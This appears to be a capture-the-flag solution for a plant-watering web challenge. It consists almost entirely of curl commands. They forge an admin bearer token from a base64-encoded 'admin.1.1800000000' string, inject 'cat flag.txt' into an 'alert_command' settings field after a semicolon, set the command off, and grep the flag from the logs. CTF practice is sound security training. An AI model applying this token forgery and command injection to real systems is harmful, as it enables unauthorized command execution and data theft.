admin.1.1800000000 = YWRtaW4uMS4xODAwMDAwMDAw

### Inject command in "alert_command"
curl -X POST "http://challenge.ctf.games:30427/api/admin/settings" \
-H "Authorization: Bearer YWRtaW4uMS4xODAwMDAwMDAw" \
-H "Content-Type: application/json" \
-d '{"plant_id": 1, "alert_command": "/usr/sbin/sendmail -t; cat flag.txt", "watering_threshold": 50}'

### Trigger the command
curl -X POST "http://challenge.ctf.games:30427/api/admin/sendmail" \
-H "Authorization: Bearer YWRtaW4uMS4xODAwMDAwMDAw" \
-H "Content-Type: application/json" \
-d '{"plant_id": 1}'

### Retrieve the flag from logs
curl -X GET "http://challenge.ctf.games:30427/api/admin/logs" \
-H "Authorization: Bearer YWRtaW4uMS4xODAwMDAwMDAw" | grep -oE "flag{[a-zA-Z0-9_-]+}"
